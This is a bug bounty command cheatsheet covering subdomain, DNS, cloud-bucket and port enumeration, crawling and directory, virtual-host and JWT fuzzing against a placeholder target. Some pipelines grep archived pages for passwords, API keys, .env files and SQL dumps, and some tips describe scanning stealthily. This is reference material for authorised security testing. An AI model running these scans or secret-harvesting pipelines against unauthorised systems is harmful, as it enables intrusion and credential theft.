# ULTIMATE BUG BOUNTY COMMAND CHEATSHEET

## 1. INITIAL RECONNAISSANCE & TARGET MAPPING


### 1.1 Subdomain Enumeration


#### 1.1.1 Passive Subdomain Enumeration
    subfinder -d target.com -all -config config.yaml -o subfinder_max.txt
    subfinder -d target.com -sources virustotal,crtsh,securitytrails -o subfinder_targeted.txt
    subfinder -d target.com -rl 50 -silent -o subfinder_stealth.txt
    subfinder -d target.com -recursive -o subfinder_recursive.txt

    amass enum -passive -d target.com -config config.ini -o amass_passive.txt
    amass enum -passive -d target.com -src -o amass_sources.txt
    amass enum -passive -d target.com -asn $(whois target.com | grep -i 'originas:' | awk '{print $2}') -o amass_asn.txt

    findomain -t target.com -r -u findomain_resolved.txt
    findomain -t target.com -q -u findomain_quiet.txt

    assetfinder --subs-only target.com > assetfinder_simple.txt
    assetfinder target.com | grep "\.target\.com$" | anew assetfinder_filtered.txt

    chaos -d target.com -key $CHAOS_KEY -o chaos_bounty.txt
    chaos -d target.com -key $CHAOS_KEY -filter "CNAME" -o chaos_cnames.txt

    github-subdomains -d target.com -t $GITHUB_TOKEN -o github_subs.txt
    github-subdomains -d target.com -t $GITHUB_TOKEN -raw -o github_raw.txt

    curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crtsh_certs.txt

    sublist3r -d target.com -t 30 -o sublist3r_fallback.txt

    cat subfinder.txt | dnsx -silent -a -resp -o resolved_subs.txt

#### 1.1.2 Active Subdomain Enumeration
    :- Active DNS Enumeration Cheatsheet

    :- AMASS BRUTE FORCE
    amass enum -active -d target.com -brute -w subdomains-top1million-5000.txt -o amass_brute.txt
    amass enum -active -d target.com -brute -rf resolvers.txt -w custom_wordlist.txt -o amass_custom_brute.txt
    amass enum -active -d target.com -p 80,443,8080,8443 -o amass_ports.txt

    :- GOBUSTER DNS
    gobuster dns -d target.com -w subdomains-top1million-5000.txt -t 100 -i -o gobuster_verbose.txt
    gobuster dns -d target.com -w subdomains.txt --wildcard -t 150 -o gobuster_wildcard.txt
    gobuster dns -d target.com -w subdomains.txt -r 1.1.1.1 -t 80 -o gobuster_cloudflare.txt

    :- SHUFFLEDNS
    shuffledns -d target.com -w subdomains-top1million-5000.txt -r resolvers.txt -o shuffledns_brute.txt
    shuffledns -d target.com -list discovered_subs.txt -r resolvers.txt -o shuffledns_resolve.txt

    :- PUREDNS
    puredns bruteforce subdomains-top1million-5000.txt target.com -r resolvers.txt -w puredns_brute.txt
    puredns resolve discovered_subs.txt -r resolvers.txt -w puredns_resolved.txt

    :- ALTDNS (Permutation)
    altdns -i discovered_subs.txt -o altdns_perms.txt -w permutations.txt -r -s altdns_stats.txt

    :- MASSDNS (Direct)
    dnsgen discovered_subs.txt | massdns -r resolvers.txt -t A -o S -w massdns_results.txt

### 1.2 DNS & Network Recon
    :- RECOMMENDED WORKFLOW:
    :- 1. Start with dnsx for basic enumeration (-a -aaaa -cname)
    :- 2. Run dnscan for brute forcing
    :- 3. Use fierce for deep traversal
    :- 4. Perform DNS recon for special records
    :- 5. Check for zone transfers
    :- 6. Gather network info via whois/bgp

    :- Always check for DNS zone transfers first (dig axfr)
    :- Use dnsx -resp-chain to map CNAME chains
    :- Combine with HTTP probing: cat dns_records.json | jq -r '.a[]?' | httpx

    :- DNSX (Fast DNS toolkit)
    dnsx -l subs.txt -a -aaaa -cname -mx -txt -ptr -ns -soa -resp -json -o dns_records.json
    dnsx -d target.com -ns -cname -resp-chain -silent -o dns_relationships.txt
    dnsx -l subdomains.txt -type A,AAAA,CNAME,MX,TXT,NS,SOA,SRV -retry 3 -o all_records.txt

    :- DNSCAN (Subdomain brute forcer)
    dnscan -d target.com -w subdomains-top1million-5000.txt -t 150 -o dnscan_brute.txt
    dnscan -d target.com -w custom_wordlist.txt -r -o dnscan_recursive.txt

    :- FIERCE (Domain reconnaissance)
    fierce --domain target.com --wide --traverse 5 --subdomains subs.txt --dnsserver 1.1.1.1 -outfile fierce_scan.txt
    fierce --domain target.com --tcpport 53 --timeout 10 -outfile fierce_tcp.txt

    :- DNSRECON (Comprehensive DNS)
    dnsrecon -d target.com -a -z -t brt -D wordlist.txt -xml dnsrecon_full.xml
    dnsrecon -d target.com -Axfr -n ns1.target.com -o zone_transfer.txt
    dnsrecon -d target.com -t srv -o srv_records.txt

    :- DIG (Manual queries)
    dig any target.com @1.1.1.1 +short | anew dig_any.txt
    dig axfr target.com @ns1.target.com +nocookie | tee zone_transfer_raw.txt
    dig +trace target.com | tee dns_trace.txt

    :- WHOIS/BGP
    whois target.com | tee whois_info.txt
    bgp.he.net search "Company Name" | tee bgp_asn.txt
    whois -h whois.radb.net '!gAS12345' | tee ip_ranges.txt

#### 1.2.1 DNS Reconnaissance
    :- RECOMMENDED WORKFLOW:
    :- 1. Start with dnsx comprehensive scan
    :- 2. Check for zone transfers (dig axfr)
    :- 3. Run targeted record queries
    :- 4. Perform brute force enumeration
    :- 5. Verify with manual dig/host commands

    :- Always check TXT records for security policies (SPF/DKIM/DMARC)
    :- Use -wd flag to filter out wildcard subdomains
    :- For internal networks, try dnsrecon -t rvl for reverse lookups
    :- Combine with HTTP probing: cat dns_a_records.txt | httpx -silent

    :- Comprehensive DNS query (all record types)
    dnsx -l subdomains.txt -a -aaaa -cname -mx -txt -ptr -ns -soa -resp -json -o dns_records_full.json

    :- Targeted record queries
    dnsx -l subdomains.txt -t A -resp -o dns_a_records.txt
    dnsx -l subdomains.txt -t CNAME -resp -o dns_cname_chains.txt
    dnsx -l subdomains.txt -t MX -o dns_mx_servers.txt
    dnsx -l subdomains.txt -t TXT -o dns_txt_records.txt

    :- Special operations
    dnsx -l subdomains.txt -r resolvers.txt -o dns_reliable_results.txt
    dnsx -l subdomains.txt -wd target.com -o dns_clean_subdomains.txt
    dnsx -l subdomains.txt -ns-resolve -o dns_ns_ips.txt

    :- DIG (Manual DNS queries)
    :- Essential record types
    dig target.com ANY +noall +answer
    dig target.com MX +short
    dig target.com TXT +short
    dig target.com NS +short

    :- Zone transfer attempts
    dig axfr target.com @ns1.target.com
    dig axfr target.com @ns2.target.com

    :- Reverse DNS
    dig -x 1.1.1.1 +short

    :- HOST (Quick lookups)
    host target.com
    host -t CNAME www.target.com
    host -t SOA target.com

    :- FIERCE (Semi-active recon)
    fierce --domain target.com --subdomains subs.txt --threads 20
    fierce --domain target.com --wide --traverse 5 --dnsserver 1.1.1.1

    :- DNSRECON (Comprehensive)
    :- Standard enumeration
    dnsrecon -d target.com -t std -o dns_standard.txt

    :- Specialized scans
    dnsrecon -d target.com -t axfr -o dns_zone_transfer.txt
    dnsrecon -d target.com -t brt -D subdomains-top1million.txt -o dns_bruteforce.txt
    dnsrecon -d target.com -t srv -o dns_srv_records.txt
    dnsrecon -d target.com -t zonewalk -o dns_nsec_walk.txt

#### 1.2.2 ASN and IP Range Discovery
    :- RECOMMENDED WORKFLOW:
    :- 1. Start with amass intel to discover ASNs
    :- 2. Use whois to verify ASN details
    :- 3. Query BGP tools for network ranges
    :- 4. Trace network paths to target
    :- 5. Map all nameserver IPs

    :- Use amass viz to visualize relationships (requires SQLite output)
    :- Combine with masscan for large network scans: masscan -p1-65535 -iL ip_ranges_as12345.txt
    :- For IPv6: amass intel -asn AS12345 -6 or whois -h whois.radb.net -- '-i origin AS12345' | grep route6

    :- PRO TIP: Combine with nmap for network mapping
    :- nmap --script targets-asn --script-args targets-asn.asn=AS12345 > nmap_asn_scan.txt


    :- AMASS INTEL (Best for ASN discovery)
    :- Find ASNs by organization name
    amass intel -org "Target Company" -whois -ip -asn -o asn_discovery.txt

    :- Get all IP ranges for an ASN
    amass intel -asn AS12345 -cidr -o ip_ranges_as12345.txt

    :- Reverse Whois lookup for CIDR
    amass intel -cidr 192.168.0.0/16 -o reverse_whois.txt

    :- WHOIS COMMANDS (Direct queries)
    :- Get ASN details
    whois -h whois.radb.net -- '-i origin AS12345' | grep -E 'route:|route6:' > radb_routes.txt

    :- Get domain whois with ASN
    whois target.com | grep -i 'originas:\|asn:' | awk '{print $2}' | sort -u > domain_asns.txt

    :- Get IP whois info
    whois 1.2.3.4 | grep -i 'netname\|originas\|asn' > ip_whois.txt

    :- BGP TOOLS (Network mapping)
    :- Get prefixes from BGPView API
    curl -s "https://api.bgpview.io/asn/12345/prefixes" | jq '.data.ipv4_prefixes[].prefix' > bgpview_prefixes.txt

    :- Get ASN details from ipinfo.io
    curl -s "https://ipinfo.io/AS12345/json" | jq '.asn,.name,.country' > ipinfo_asn.json

    :- NETWORK TRACING
    :- Get IPs from DNS trace
    dig +trace target.com | grep -E 'IN\s+A|IN\s+AAAA' | awk '{print $5}' | sort -u > dns_trace_ips.txt

    :- Get IPs from TCP traceroute (port 80)
    traceroute -n -T -p 80 target.com | awk '$2~/[0-9]/{print $2}' | sort -u > tcp_trace_ips.txt

    :- NS LOOKUP
    :- Get all nameserver IPs
    dig +short ns target.com | xargs -I{} dig +short {} | sort -u > all_ns_ips.txt

### 1.3 Cloud Infrastructure
    :- CLOUD ENUMERATION (Multi-cloud)
    :- Full cloud reconnaissance
    cloud_enum -k target -t aws,azure,gcp -l cloud_enum_full.log -details -verify -public

    :- Targeted service enumeration
    cloud_enum -k target -t aws:s3,ec2,lambda -l aws_specific.log
    cloud_enum -k target -t azure:storage,vm,appservice -l azure_specific.log
    cloud_enum -k target -t gcp:storage,compute,functions -l gcp_specific.log

    :- SECURITY AUDITING (ScoutSuite)
    :- Comprehensive AWS audit
    scout suite --provider aws --regions all --report-dir scout_aws_full

    :- Azure tenant audit
    scout suite --provider azure --tenant-id $AZURE_TENANT_ID --report-dir scout_azure_tenant

    :- Targeted region audit
    scout suite --provider aws --regions us-east-1,eu-west-1 --report-dir scout_aws_critical_regions

    :- CLOUD FLAWS SCANNER (CFR)
    :- S3 bucket analysis
    cfr -u https://target.s3.amazonaws.com/ -o cfr_s3_root.txt
    cfr -u https://s3.amazonaws.com/target-backups/ -o cfr_s3_backups.txt

    :- Azure storage scanning
    cfr -u https://target.blob.core.windows.net/$web/ -o cfr_azure_web.txt
    cfr -u https://target.file.core.windows.net/share/ -o cfr_azure_files.txt

    :- STORAGE BUCKET SCANNING
    :- S3 bucket discovery
    s3scanner scan -l buckets.txt -o s3_results.json -a -p sensitive/

    :- Targeted bucket checks
    s3scanner scan -b target-backup-bucket -o s3_backup_check.json -p db_backups/

    :- GCP bucket brute force
    gcpbucketbrute -k target -w common_bucket_names.txt -threads 100 -o gcp_common.txt
    gcpbucketbrute -k target -prefix prod- -o gcp_prod_buckets.txt

    :- SECURITY COMPLIANCE (Prowler)
    :- CIS Benchmark scan
    prowler -g cislevel1 -M json -o prowler_cis_report

    :- Full security assessment
    prowler -g cislevel1,cislevel2 -M html -o prowler_full_report

    :- RECOMMENDED WORKFLOW:
    :- 1. Start with cloud_enum for asset discovery
    :- 2. Run ScoutSuite for security posture
    :- 3. Check storage buckets with CFR/s3scanner
    :- 4. Perform targeted brute forcing
    :- 5. Validate compliance with Prowler

    :- PRO TIPS:
    :- Always use '-verify' with cloud_enum to confirm findings
    :- For Azure: Set AZURE_TENANT_ID and AZURE_CLIENT_ID env vars
    :- For GCP: Authenticate with 'gcloud auth application-default login'
    :- Combine with 'awscli' for manual verification: 
    :- aws s3 ls s3://target-bucket/ --no-sign-request
    :- Use -details flag to get verbose cloud metadata
    :- Combine with jq for JSON analysis: jq '.vulnerable_buckets[]' s3_results.json
    :- For Azure: Add --subscriptions parameter to ScoutSuite for specific subscriptions
    :- Schedule regular Prowler scans with -b for brief mode


#### 1.3.1 Cloud Infrastructure Identification (AWS, Azure, GCP)
    :- CLOUD_ENUM (Multi-cloud discovery)
    :- Full cloud reconnaissance
    cloud_enum -k target -t aws,azure,gcp -o cloud_enum_full.log

    :- Targeted provider scans
    cloud_enum -k target.com -t aws -o aws_target.log
    cloud_enum -k "Company Name" -t azure -o azure_company.log
    cloud_enum -k "project-id" -t gcp -o gcp_project.log

    :- File-based enumeration
    cloud_enum -kf target_list.txt -t aws -o aws_from_file.log

    :- S3SCANNER (AWS S3)
    :- Scan bucket list with full checks
    s3scanner scan -l buckets.txt --all-perms -o s3_full_audit.json

    :- Targeted bucket inspection
    s3scanner scan --bucket target-prod -o s3_prod_bucket.json

    :- GCPBUCKETBRUTE (Google Cloud)
    :- Brute force with common terms
    gcpbucketbrute -k target -w top_1000.txt -o gcp_common_buckets.txt

    :- Domain-based permutations
    gcpbucketbrute -d target.com -o gcp_domain_buckets.txt

    :- RECOMMENDED WORKFLOW:
    :- 1. Start with cloud_enum for broad discovery
    :- 2. Run targeted scans for each cloud provider
    :- 3. Verify S3/GCP storage buckets
    :- 4. Check permissions on found resources

    :- PRO TIPS:
    :- For AWS: Add '-t aws:s3,ec2' to focus on specific services
    :- For Azure: Include '-t azure:storage,blob' for storage checks
    :- For GCP: Use '-t gcp:storage,compute' for focused scanning
    :- Always check '-o' output files for sensitive findings


### 1.4 Port Scanning
    :- COMPREHENSIVE TCP SCAN (Nmap)
    :- Full port scan with service detection
    nmap -sV -T4 -p- -oA full_scan target.com

    :- Fast top ports scan
    nmap -sV -T4 --top-ports 100 -oA quick_scan target.com

    :- UDP top ports scan
    nmap -sU -T4 --top-ports 50 -oA udp_scan target.com

    :- FAST PORT SCANNERS
    :- Naabu (rapid port discovery)
    naabu -host target.com -p - -silent -o naabu_full.txt

    :- RustScan (blazing fast)
    rustscan -a target.com --ulimit 5000 -- -sV -oN rustscan.txt

    :- Masscan (Internet-scale)
    masscan -p1-65535 target.com --rate=10000 -oG masscan.out

    :- SSL/TLS TESTING
    :- Comprehensive SSL check
    testssl.sh -e -E -f -U -S -P -Q --json target.com.json target.com

    :- Fast TLS inspection
    tlsx -u target.com -san -cn -silent -o tlsx_results.txt

    :- RECOMMENDED WORKFLOW:
    :- 1. Start with RustScan/Naabu for quick discovery
    :- 2. Run Nmap on found ports for service detection
    :- 3. Perform SSL/TLS checks on web ports
    :- 4. Use Masscan for large scope scans

    :- PRO TIPS:
    :- For internal networks: Add '-Pn' to skip host discovery
    :- For stealth: Use '-sS -T2' in Nmap
    :- To scan multiple targets: 'nmap -iL targets.txt'
    :- For web services: Combine with httpx for HTTP verification

### 1.5 Technology Fingerprinting
    :- WHATWEB (Comprehensive fingerprinting)
    :- Verbose scan with aggressive detection
    whatweb https://target.com -v -a 3 --color=never -o whatweb_single.txt

    :- Batch scan with XML output
    whatweb -i live_subdomains.txt -U "Mozilla/5.0" --log-xml=whatweb_report.xml

    :- Targeted plugin scan
    whatweb https://target.com --plugins=Apache,PHP,WordPress,Joomla --no-errors

    :- WEBANALYZE (Alternative fingerprinting)
    :- Single host analysis
    webanalyze -host https://target.com -output webanalyze_single.json

    :- Crawl and analyze multiple hosts
    webanalyze -hosts live_hosts.txt -crawl 2 -output webanalyze_crawled.json

    :- HTTPX (Fast tech detection)
    :- Basic tech detection with status
    httpx -l urls.txt -tech-detect -status-code -title -o httpx_basic.txt

    :- Full tech detection with screenshots
    httpx -l urls.txt -tech-detect -screenshot -favicon -json -o httpx_full.json

    :- RECOMMENDED WORKFLOW:
    :- 1. Start with httpx for quick tech detection
    :- 2. Use WhatWeb for detailed fingerprinting
    :- 3. Run WebAnalyze for additional verification
    :- 4. Combine results for comprehensive view

    :- PRO TIPS:
    :- For stealth: Rotate user agents with '-U random' in WhatWeb
    :- For large scans: Add '-t 50' to increase threads in httpx
    :- To compare results: 'jq' for JSON output analysis
    :- For monitoring: Schedule regular scans with cron


## 2. WEB DISCOVERY & CONTENT CRAWLING


### 2.1 URL Discovery
    :- ARCHIVAL SOURCES (GAU/Wayback)
    :- Comprehensive URL discovery (all sources)
    gau target.com --subs --threads 50 --o gau_all_urls.txt
    gau target.com --providers wayback,commoncrawl,otx --json -o gau_specific.json

    :- Wayback Machine specialized queries
    waybackurls target.com --dates 2020-2023 | anew wayback_2020-2023.txt
    waybackurls target.com | grep -E "\.js(on)?$" | anew wayback_js_files.txt
    waybackurls target.com | grep "\?" | grep -v "\.\(css\|jpg\|png\)" | anew wayback_params.txt

    :- ACTIVE CRAWLING TOOLS
    :- Katana (advanced crawling)
    katana -u https://target.com -d 4 -jc -kf -o katana_deep.txt
    katana -list live_urls.txt -ef woff,css,png -aff php,aspx -o katana_filtered.txt

    :- Gospider (powerful spider)
    gospider -s https://target.com -d 3 -t 20 -c 10 --js --other-source -o gospider_full
    gospider -S subdomains.txt -d 2 --blacklist ".(jpg|png|css)$" -o gospider_subdomains

    :- Hakrawler (fast crawler)
    hakrawler -url https://target.com -d 3 -subs -u -t 15 -scope target.com -o hakrawler.txt
    hakrawler -url https://target.com -proxy http://127.0.0.1:8080 -insecure -o hakrawler_proxied.txt

    :- FILTERING & PROCESSING

    :- Filter interesting URLs
    cat gau_all_urls.txt | grep -E "api|admin|auth" | anew sensitive_urls.txt
    cat katana_deep.txt | grep "\.php" | grep "id=" | anew php_params.txt

    :- Extract parameters
    cat wayback_params.txt | unfurl -u format %q | sort -u > all_params.txt

    :- Combine and dedupe
    cat gau_all_urls.txt wayback_*.txt katana_*.txt | sort -u > all_urls.txt

    :- RECOMMENDED WORKFLOW:
    :- 1. Start with gau/waybackurls for historical data
    :- 2. Run katana/gospider for active crawling
    :- 3. Filter results for sensitive endpoints
    :- 4. Extract parameters for testing
    :- 5. Combine all sources for complete coverage

    :- PRO TIPS:
    :- For large scopes: Split domains and parallelize with GNU parallel
    :- For authentication: Use '-H "Cookie: session=xyz"' in crawling tools
    :- For stealth: Rotate user agents and use delays
    :- For monitoring: Schedule weekly scans with cron + git for versioning

#### 2.1.1 URL Discovery from Multiple Sources


#### 2.1.2 Sitemap Discovery & Parsing
    :- MANUAL SITEMAP EXTRACTION
    :- Basic sitemap parsing with curl
    curl -s https://target.com/sitemap.xml | grep -Eo '<loc>[^<]+' | sed 's/<loc>//' > sitemap_urls.txt

    :- Handle compressed sitemaps
    curl -s https://target.com/sitemap.xml.gz | gunzip | grep -Eo '<loc>[^<]+' | sed 's/<loc>//' > sitemap_urls.txt

    :- Parse sitemap index (with recursive fetching)
    curl -s https://target.com/sitemap_index.xml | grep -Eo '<loc>[^<]+' | sed 's/<loc>//' | xargs -I{} sh -c 'curl -s {} | grep -Eo "<loc>[^<]+" | sed "s/<loc>//"' > all_sitemap_urls.txt

    :- AUTOMATED TOOLS
    :- Katana sitemap discovery
    katana -u https://target.com -sitemap -o katana_sitemap.txt

    :- Gospider sitemap processing
    gospider -s https://target.com --sitemap --other-source -o gospider_sitemap.txt

    :- SITEMAP FUZZING
    :- Common sitemap locations
    ffuf -w /path/to/sitemap_wordlist.txt -u https://target.com/FUZZ -mc 200 -o ffuf_sitemap.json

    :- Sitemap wordlist should contain:
    :- sitemap.xml
    :- sitemap_index.xml
    :- sitemap1.xml
    :- sitemap_news.xml
    :- sitemap-a.xml
    :- sitemap.gz
    :- wp-sitemap.xml
    :- robots.txt

    :- ROBOTS.TXT CHECK
    curl -s https://target.com/robots.txt | grep -i "sitemap" | awk -F': ' '{print $2}' > discovered_sitemaps.txt

    :- ADVANCED TECHNIQUES

    :- 1. Combine all methods
    cat <(curl -s https://target.com/robots.txt | grep -i sitemap | awk '{print $2}') \
        <(ffuf -w sitemap_wordlist.txt -u https://target.com/FUZZ -mc 200 -of csv | awk -F, '{print $1}') \
        | sort -u | xargs -I{} sh -c 'curl -s {} | grep -Eo "<loc>[^<]+" | sed "s/<loc>//"' > all_urls.txt

    :- 2. Parallel processing
    cat sitemap_list.txt | parallel -j 10 'curl -s {} | grep -Eo "<loc>[^<]+" | sed "s/<loc>//"' > urls.txt

    :- 3. JQ processing for JSON sitemaps
    curl -s https://target.com/sitemap.json | jq -r '.urls[].loc' > json_sitemap_urls.txt

    :- PRO TIPS:
    :- 1. Always check /robots.txt first
    :- 2. Try common sitemap paths if standard ones fail
    :- 3. Look for compressed sitemaps (.gz)
    :- 4. Combine with waybackurls for historical sitemaps
    :- 5. Use '-H "Accept: application/xml"' header for stubborn endpoints


#### 2.1.3 Robots.txt Analysis
    :- BASIC FETCH & PARSE
    :- Fetch robots.txt and highlight disallowed paths
    curl -s https://target.com/robots.txt | grep --color -E "Disallow:|Allow:"

    :- Extract disallowed paths (clean output)
    curl -s https://target.com/robots.txt | awk '/Disallow:/ {print $2}' | sort -u > disallowed.txt

    :- Extract sitemap references
    curl -s https://target.com/robots.txt | grep -i sitemap | awk '{print $2}' > sitemaps.txt

    :- ADVANCED ANALYSIS
    :- Check path accessibility (with status codes)
    cat disallowed.txt | xargs -I{} sh -c 'echo -n "{} - "; curl -s -o /dev/null -w "%{http_code}\n" "https://target.com{}"' > path_status.txt

    :- FFUF mass testing (fast)
    ffuf -w disallowed.txt -u https://target.com/FUZZ -mc 200,403 -o ffuf_robots_results.json

    :- SPECIALIZED TOOLS
    :- Using robotstxt (Python parser)
    robotstxt https://target.com/robots.txt --disallow --output disallowed_paths.json

    :- Using hakrawler's robots parser
    hakrawler -robots -url https://target.com -o robots_analysis.txt

    :- PROBING TECHNIQUES

    :- 1. Check for directory listing
    cat disallowed.txt | grep -v "\." | xargs -I{} sh -c 'curl -s "https://target.com{}" | grep -q "Index of" && echo "Directory listing: {}"'

    :- 2. Find hidden files
    cat disallowed.txt | grep "\.\w\+$" | xargs -I{} sh -c 'curl -s -o /dev/null -w "%{http_code} - {}\n" "https://target.com{}"'

    :- 3. Combine with common extensions
    cat disallowed.txt | while read path; do
    for ext in .bak .old .txt .json; do
        curl -s -o /dev/null -w "%{http_code} - $path$ext\n" "https://target.com$path$ext"
    done
    done > extended_checks.txt

    :- PRO TIPS:
    :- 1. Always check both HTTP and HTTPS versions
    :- 2. Look for commented-out paths (# Disallow: /secret/)
    :- 3. Test with trailing slashes and without
    :- 4. Check for case-sensitive paths
    :- 5. Combine with Wayback Machine data:
    :-    waybackurls target.com | grep -f disallowed.txt

    :- EXAMPLE WORKFLOW:
    :- 1. curl -s https://target.com/robots.txt > robots.txt
    :- 2. Extract disallowed paths
    :- 3. ffuf -w disallowed.txt -u https://target.com/FUZZ -mc 200,403,401 -o results.json
    :- 4. Analyze accessible paths manually


#### 2.1.4 Wayback Machine for Deleted/Old Content Analysis
    :- Specifically looking for content that is no longer live
    
    waybackurls target.com | grep -E '\.(bak|old|zip|sql|config|log|env)' | anew potential_old_sensitive_files.txt 
    :- Filter wayback results for sensitive extensions

    waybackurls target.com | while read url; do curl -s "$url" | grep "password\|api_key\|secret"; done 
    :- Curl old URLs found and grep for keywords (can be slow/noisy)

    :- SENSITIVE FILE DISCOVERY
    :- Find backup/config files in Wayback
    waybackurls target.com | grep -E '\.(bak|old|zip|sql|tar\.gz|config|log|env|swp|~)$' \
        | anew potential_sensitive_files.txt

    :- Find common sensitive filenames
    waybackurls target.com | grep -iE '(config|backup|dump|secret)\.(php|json|xml|sql)' \
        | anew common_sensitive_names.txt

    :- CONTENT ANALYSIS
    :- Search for secrets in historical pages (parallelized)
    waybackurls target.com | parallel -j 20 'curl -s {} | grep -E "password|api[_-]?key|secret|token"' \
        | anew potential_secrets.txt

    :- Find exposed developer files
    waybackurls target.com | grep -E '\.(git/|svn/|hg/|bzr/|DS_Store)' \
        | anew version_control_exposures.txt

    :- SMART VERIFICATION
    :- Check if files are still live (fast)
    cat potential_sensitive_files.txt | httpx -status-code -title -o still_live_sensitive_files.txt

    :- DEEP CONTENT SEARCH
    :- Find PHP info files
    waybackurls target.com | grep -i 'phpinfo\.php' | anew phpinfo_files.txt

    :- Find install/setup files
    waybackurls target.com | grep -iE '(install|setup)\.(php|asp|aspx)' \
        | anew installation_files.txt

    :- ADVANCED TECHNIQUES

    :- 1. Combine with gau for current+historical
    gau target.com | grep -E '\.env$' | anew all_env_files.txt

    :- 2. Find database dumps
    waybackurls target.com | grep -E '\.sql$' | httpx -content-length -match-string "INSERT INTO" \
        | anew live_sql_dumps.txt

    :- 3. Search for hardcoded credentials
    waybackurls target.com | while read url; do
        curl -s "$url" | grep -E 'password\s*=\s*["'\''][^"'\'' ]+["'\'']' \
            && echo "Found in: $url"
    done | anew hardcoded_creds.txt

    :- PRO TIPS:
    :- 1. Use '-j 20' in parallel to control threads
    :- 2. Combine with 'gf patterns' for better filtering
    :- 3. For large sites: add '| head -n 1000' to test first
    :- 4. Use '-fs 0' in httpx to filter out 404s
    :- 5. Store raw responses for later analysis:
    :-    waybackurls target.com | httpx -json -o wayback_responses.json


### 2.2 Content Discovery
    :- FEROXBUSTER (Fast, Rust-based)
    feroxbuster -u https://target.com -w wordlist.txt -t 50 -o ferox_results.txt
    feroxbuster -u https://target.com -w wordlist.txt -x php,html -n -k -C 404,403

    :- FFUF (Highly customizable)
    :- Basic scan
    ffuf -w wordlist.txt -u https://target.com/FUZZ -o ffuf_basic.json

    :- Advanced scan (filter custom 404s)
    ffuf -w wordlist.txt -u https://target.com/FUZZ -t 100 -fs 4242 -mc 200,301,302 -o ffuf_advanced.json

    :- Virtual host discovery
    ffuf -w subdomains.txt -u https://target.com -H "Host: FUZZ.target.com" -o vhosts.json

    :- DIRSEARCH (Python-based)
    dirsearch -u https://target.com -e php,asp,aspx,jsp,html -t 100 -x 403,404 --format=json -o dirsearch_out.json

    :- GOBUSTER (Go-based)
    :- Standard scan
    gobuster dir -u https://target.com -w wordlist.txt -x php,html -o gobuster.txt

    :- DNS mode (subdomain brute-forcing)
    gobuster dns -d target.com -w subdomains.txt -o dns_brute.txt

    :- WFUZZ (Python-based)
    wfuzz -c -z file,wordlist.txt --hc 404,400 https://target.com/FUZZ
    wfuzz -c -z file,wordlist.txt --sc 200 -H "X-Custom-Header: test" https://target.com/FUZZ

    :- ======================
    :- COMMON CRAWL QUERIES
    :- ======================

    :- Using cc-index-client (requires setup)
    cc-index-client --query "url=target.com/admin" --output cc_admin_paths.json

    :- Alternative API approach
    curl "https://index.commoncrawl.org/CC-MAIN-2023-23-index?url=target.com/login&output=json" | jq

    :- ======================
    :- RESPONSE CODE STRATEGIES
    :- ======================

    :- 1. Filtering custom 404s (find the size first)
    curl -s -o /dev/null -w "%{size_download}" https://target.com/random404page
    :- Then use with ffuf: -fs 1234

    :- 2. Tracking redirect chains
    ffuf -w wordlist.txt -u https://target.com/FUZZ -fr "redirects-to:login" -o redirects.json

    :- 3. Finding debug endpoints
    ffuf -w wordlist.txt -u https://target.com/FUZZ -mr "DEBUG" -o debug_pages.json

    :- ======================
    :- PRO TIPS:
    :- 1. Always find and filter custom 404 pages first
    :- 2. For WordPress: use '-w /usr/share/wordlists/wfuzz/general/common.txt'
    :- 3. Rotate user agents with '-H "User-Agent: random"'
    :- 4. For API discovery: add '-x json' extension
    :- 5. Combine with nuclei: 'cat valid_paths.txt | nuclei -t exposures/'
    :- ======================

    :- RECOMMENDED WORDLISTS:
    :- - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    :- - /usr/share/wordlists/dirb/common.txt
    :- - /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
    :- - Custom lists based on target tech (e.g., wp-content for WordPress)


#### 2.2.1 Directory/File Brute Forcing
    # FFUF (Most versatile)
    # Fast recursive scan with common extensions
    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -u https://target.com/FUZZ \
    -t 200 \
    -recursion \
    -recursion-depth 2 \
    -e .php,.html,.js,.json \
    -o ffuf_recursive.json \
    -of json \
    -v

    # API endpoint discovery
    ffuf -w /usr/share/seclists/Discovery/Web-Content/api/endpoints.txt \
    -u https://target.com/api/FUZZ \
    -t 150 \
    -mc 200,201,204 \
    -H "Authorization: Bearer token" \
    -o ffuf_api.json

    # FEROXBUSTER (Fast Rust-based)
    # Comprehensive scan with smart filtering
    feroxbuster -u https://target.com \
    -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
    -t 50 \
    -x php,html,js \
    -d 3 \
    --filter-status 404,403 \
    --extract-links \
    --auto-tune \
    -o ferox_full.txt

    # DIRSEARCH (Python-based)
    # Deep scan with backup file checking
    dirsearch -u https://target.com \
    -e php,asp,aspx,jsp,html,js,json \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
    -t 100 \
    -r -R 2 \
    --exclude-status 404,500 \
    --random-agents \
    -o dirsearch_deep.json \
    --format=json

    # GOBUSTER (Simple Go-based)
    # Quick scan with common extensions
    gobuster dir -u https://target.com \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -x php,html,js \
    -t 100 \
    -k \
    -o gobuster_quick.txt

    # WFuzz (Advanced filtering)
    # Parameter fuzzing with regex filtering
    wfuzz -c \
    -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -H "Content-Type: application/json" \
    --hh 0 \
    --hc 404 \
    --filter "s>0" \
    https://target.com/api/search?FUZZ=test

    # ======================
    # PRO TIPS & ADVANCED TECHNIQUES
    # ======================

    # 1. Custom 404 Handling
    # First find 404 page size:
    curl -s -o /dev/null -w "%{size_download}" https://target.com/nonexistentpage
    # Then use in ffuf: -fs 1234

    # 2. Smart Recursion
    # Only recurse into promising paths:
    ffuf -w wordlist.txt -u https://target.com/FUZZ \
    -recursion \
    -recursion-strategy greedy \
    -recursion-depth 3

    # 3. JWT Token Fuzzing
    ffuf -w /usr/share/seclists/Discovery/Web-Content/jwt-tokens.txt \
    -u https://target.com/api \
    -H "Authorization: Bearer FUZZ" \
    -mc 200,403

    # 4. Virtual Host Discovery
    ffuf -w subdomains.txt \
    -u https://target.com \
    -H "Host: FUZZ.target.com" \
    -fs 4242 \
    -o vhosts.json

    # 5. Backup File Hunting
    ffuf -w /usr/share/seclists/Discovery/Web-Content/backup-filenames.txt \
    -u https://target.com/FUZZ \
    -t 50 \
    -mc 200 \
    -o backups.json

